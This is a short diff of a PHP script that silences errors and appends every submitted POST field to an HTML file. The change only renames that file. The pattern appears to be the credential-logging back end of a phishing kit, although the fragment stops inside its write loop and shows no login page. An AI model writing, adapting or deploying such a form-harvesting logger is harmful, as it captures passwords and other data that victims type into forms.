@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-$handle = fopen("rta.html","a");
+$handle = fopen("pothi_dekh.html","a");
 foreach($_POST as $variable => $value)
 {
   fwrite($handle, $variable);
